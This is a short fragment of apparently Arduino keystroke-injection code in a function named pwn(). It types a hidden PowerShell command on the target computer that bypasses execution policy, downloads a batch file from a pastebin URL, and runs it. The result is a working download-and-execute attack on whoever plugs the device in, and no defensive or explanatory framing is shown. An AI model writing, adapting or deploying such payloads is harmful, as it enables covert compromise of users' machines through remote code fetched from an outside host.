...
void pwn()
{
 ...
 key(KEY_ENTER, 0);
 delay(1100);
 Keyboard.println("powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/RCRmVj6N','sys.bat')");
 Keyboard.println("sys.bat");
